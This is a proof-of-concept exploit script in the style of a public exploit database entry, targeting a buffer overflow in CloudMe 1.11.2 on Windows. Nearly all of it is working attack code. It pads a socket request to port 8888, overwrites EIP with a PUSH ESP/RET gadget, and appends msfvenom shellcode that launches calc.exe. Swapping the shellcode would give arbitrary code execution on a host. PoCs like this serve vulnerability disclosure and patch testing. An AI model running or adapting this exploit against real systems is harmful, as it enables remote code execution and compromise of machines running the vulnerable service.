# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

#msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python
buf =  b""
buf += b"\xdb\xd8\xd9\x74\x24\xf4\x5b\xbe\xa4\x9a\xb2\xed"
buf += b"\x33\xc9\xb1\x52\x83\xeb\xfc\x31\x73\x13\x03\xd7"
buf += b"\x89\x50\x18\xeb\x46\x16\xe3\x13\x97\x77\x6d\xf6"
buf += b"\xa6\xb7\x09\x73\x98\x07\x59\xd1\x15\xe3\x0f\xc1"
buf += b"\xae\x81\x87\xe6\x07\x2f\xfe\xc9\x98\x1c\xc2\x48"
buf += b"\x1b\x5f\x17\xaa\x22\x90\x6a\xab\x63\xcd\x87\xf9"
buf += b"\x3c\x99\x3a\xed\x49\xd7\x86\x86\x02\xf9\x8e\x7b"
buf += b"\xd2\xf8\xbf\x2a\x68\xa3\x1f\xcd\xbd\xdf\x29\xd5"
buf += b"\xa2\xda\xe0\x6e\x10\x90\xf2\xa6\x68\x59\x58\x87"
buf += b"\x44\xa8\xa0\xc0\x63\x53\xd7\x38\x90\xee\xe0\xff"
buf += b"\xea\x34\x64\x1b\x4c\xbe\xde\xc7\x6c\x13\xb8\x8c"
buf += b"\x63\xd8\xce\xca\x67\xdf\x03\x61\x93\x54\xa2\xa5"
buf += b"\x15\x2e\x81\x61\x7d\xf4\xa8\x30\xdb\x5b\xd4\x22"
buf += b"\x84\x04\x70\x29\x29\x50\x09\x70\x26\x95\x20\x8a"
buf += b"\xb6\xb1\x33\xf9\x84\x1e\xe8\x95\xa4\xd7\x36\x62"
buf += b"\xca\xcd\x8f\xfc\x35\xee\xef\xd5\xf1\xba\xbf\x4d"
buf += b"\xd3\xc2\x2b\x8d\xdc\x16\xfb\xdd\x72\xc9\xbc\x8d"
buf += b"\x32\xb9\x54\xc7\xbc\xe6\x45\xe8\x16\x8f\xec\x13"
buf += b"\xf1\xba\xfa\x0b\x0b\xd3\xf8\x2b\x28\x08\x74\xcd"
buf += b"\x44\x5e\xd0\x46\xf1\xc7\x79\x1c\x60\x07\x54\x59"
buf += b"\xa2\x83\x5b\x9e\x6d\x64\x11\x8c\x1a\x84\x6c\xee"
buf += b"\x8d\x9b\x5a\x86\x52\x09\x01\x56\x1c\x32\x9e\x01"
buf += b"\x49\x84\xd7\xc7\x67\xbf\x41\xf5\x75\x59\xa9\xbd"
buf += b"\xa1\x9a\x34\x3c\x27\xa6\x12\x2e\xf1\x27\x1f\x1a"
buf += b"\xad\x71\xc9\xf4\x0b\x28\xbb\xae\xc5\x87\x15\x26"
buf += b"\x93\xeb\xa5\x30\x9c\x21\x50\xdc\x2d\x9c\x25\xe3"
buf += b"\x82\x48\xa2\x9c\xfe\xe8\x4d\x77\xbb\x19\x04\xd5"
buf += b"\xea\xb1\xc1\x8c\xae\xdf\xf1\x7b\xec\xd9\x71\x89"
buf += b"\x8d\x1d\x69\xf8\x88\x5a\x2d\x11\xe1\xf3\xd8\x15"
buf += b"\x56\xf3\xc8"

payload = buf

overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))

buf = padding1 + EIP + NOPS + payload + overrun

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(buf)
except Exception as e:
	print(sys.exc_value)
